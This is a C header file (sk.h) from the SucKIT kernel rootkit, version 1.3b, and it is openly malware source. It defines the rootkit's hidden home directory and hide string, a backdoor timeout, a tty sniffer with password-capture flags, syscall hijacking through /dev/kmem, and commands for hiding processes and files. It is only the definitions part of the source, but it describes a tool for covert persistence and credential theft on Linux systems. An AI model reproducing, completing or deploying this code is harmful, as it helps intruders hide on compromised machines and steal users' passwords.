/*
 * $Id: sk.h, general suckit defs
 */

#ifndef SK_H
#define SK_H

// ups ..we should disable that funny msgs @startup error
#define BE_LAME		0

/* size of blocks for ENV transfer */
#define	ENVLEN		64

/* backdoor timeout - 2 minutes lag */
#define	BDTIMEOUT	120

#define	DEFHOME		"/usr/share/locale/sk/.sk12"
#define	DEFHIDE		"sk12"

/* undef this if you don't like to snarf ttys */
//#undef	SNIFFER		
#define SNIFFER		
#define	SNIFFDIR	".sniffer"
#define	SNIFFMAX	1024*512	/* max bytes to sniff per pid */

// for init stuff starting
//#undef INITSTUFF	
#define INITSTUFF

/* types */
#define dev_t	unsigned short
#define	uchar	unsigned char
#define ushort	unsigned short
#define	uint	unsigned int
#define ulong	unsigned long
#define size_t	unsigned
#define time_t	unsigned


#ifndef	VERSION
#define	VERSION	"1.3b"
#endif

#ifndef HEXVER
#define HEXVER 0x013b
#endif

/* a piece of crap ;) */
/*
#define BANNER \
	"\e[1;36m[\e[0;36m===== SucKIT version " VERSION ", " \
	__DATE__ " <http://sd.g-art.nl/sk> =====\e[1;36m]\e[0;36m\n" \
	"\e[1;36m[\e[0;36m====== (c)oded by sd <sd@cdi.cz> & " \
	"devik <devik@cdi.cz>, 2002 ======\e[1;36m]\e[0;36m\e[0m" \
*/
#define BANNER "/dev/null"

/* the syscall we'll use for comunication and kmalloc() */
#define	OURCALL oldolduname
#define	OURSYS __NR_oldolduname
#define __NR_OURSYS OURSYS
#define __NR_OURCALL OURSYS

#ifndef DEFAULT_KMEM
#define	DEFAULT_KMEM	"/dev/kmem"
#endif

#ifndef	HIDESTR
#define	HIDESTR		"sk12"
#endif

#define	ALIGN4K(x)	((x+4095) & ~4095)
#define	KERNEL_DS	0xffffffff


/* the struct used for communication user <> kernel */
typedef struct {
	ulong	magic1;
	ulong	magic2;
	ulong	cmd;
	ulong	arg;
	int	ret;
	uchar	buf[8192];
}__attribute__ ((packed)) sk_io;

typedef struct {
	int	fd;
	int	len;
	int	pos;
	int	data_len;
	uchar	data[1];
} __attribute__ ((packed)) net_struc;

typedef struct {
        ushort  pid;
	ushort	fd;
        net_struc *net;
} __attribute__ ((packed)) pid_struc;

#define	PID_CNT		512
#define	PID_TABSIZE	(PID_CNT*sizeof(pid_struc))
#define	SCT_TABSIZE	(256*4)
#define	CMD_GETVER	0

/* this is really nasty ... we must use very different numbers
   in any switch {} statement, otherwise compiler will
   optimize it to "jumping table" -- we can't relocate it
   and the worst happens ... */
#define	CMD_UNINSTALL	2346
#define	CMD_HIDEPID	8093
#define	CMD_UNHIDEPID	3462
#define	CMD_PIDHIDING	2456
#define	CMD_FILEHIDING	2212
#define CMD_COMMHACK	1021

/* process flags to speed up find_pid() lookups */
#define	PF_SNIFFING	0x10000000
#define	PF_PASSWORD	0x20000000
#define	PF_NET		0x40000000
#define	PF_MASK		(PF_SNIFFING | PF_PASSWORD | PF_NET)

#define	BAD_COUNT	5
#endif
